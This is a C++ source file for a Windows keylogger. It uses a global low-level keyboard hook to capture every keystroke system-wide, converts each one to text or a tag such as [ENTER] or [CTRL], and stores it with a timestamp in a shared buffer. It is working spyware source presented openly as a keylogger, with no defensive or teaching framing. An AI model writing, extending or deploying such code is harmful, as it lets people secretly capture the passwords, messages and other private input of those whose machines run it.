#include "keylogger.h"
#include "globals.h"
#include "utils.h"
#include <windows.h>
#include <iostream>
#include <string>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <chrono>

using namespace std;

// The hook handle
HHOOK keyboard_hook = NULL;

static string get_local_timestamp() {
    auto now = chrono::system_clock::now();
    auto t = chrono::system_clock::to_time_t(now);
    stringstream ss;
    ss << put_time(localtime(&t), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

LRESULT CALLBACK keyboard_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        auto kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD vk = kb->vkCode;
        BYTE state[256] = {0};
        GetKeyboardState(state);

        WCHAR wbuf[8] = {0};
        int len = ToUnicode(vk, kb->scanCode, state, wbuf, _countof(wbuf), 0);

        string key;
        if (len > 0) {
            char mb[8] = {0};
            WideCharToMultiByte(CP_ACP, 0, wbuf, len, mb, _countof(mb), NULL, NULL);
            key = mb;
        } else {
            switch (vk) {
                case VK_RETURN:    key = "[ENTER]";    break;
                case VK_BACK:      key = "[BACKSPACE]";break;
                case VK_TAB:       key = "[TAB]";      break;
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT:    key = "[SHIFT]";    break;
                case VK_CONTROL:
                case VK_LCONTROL:
                case VK_RCONTROL:  key = "[CTRL]";     break;
                case VK_ESCAPE:    key = "[ESC]";      break;
                case VK_SPACE:     key = " ";          break;
                case VK_LEFT:      key = "[LEFT]";     break;
                case VK_RIGHT:     key = "[RIGHT]";    break;
                case VK_UP:        key = "[UP]";       break;
                case VK_DOWN:      key = "[DOWN]";     break;
                default: {
                    ostringstream oss;
                    oss << "[0x" << hex << vk << "]";
                    key = oss.str();
                }
            }
        }

        extern string key_buffer;
        key_buffer += get_local_timestamp() + ": " + key + "\n";

        if (g_debug_mode) {
            cout << "Keylogger captured: " << key
                 << " (buffer=" << key_buffer.size() << ")" << endl;
        }
    }
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

bool start_keylogger() {
    if (g_debug_mode) {
        cout << "Initializing keylogger..." << endl;
    }

    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook_proc, NULL, 0);
    if (!keyboard_hook) {
        if (g_debug_mode) {
            cerr << "Failed to install hook, error=" << GetLastError() << endl;
        }
        return false;
    }
    if (g_debug_mode) {
        cout << "Keylogger hook installed" << endl;
    }

    // Message loop to keep the hook active
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return true;
}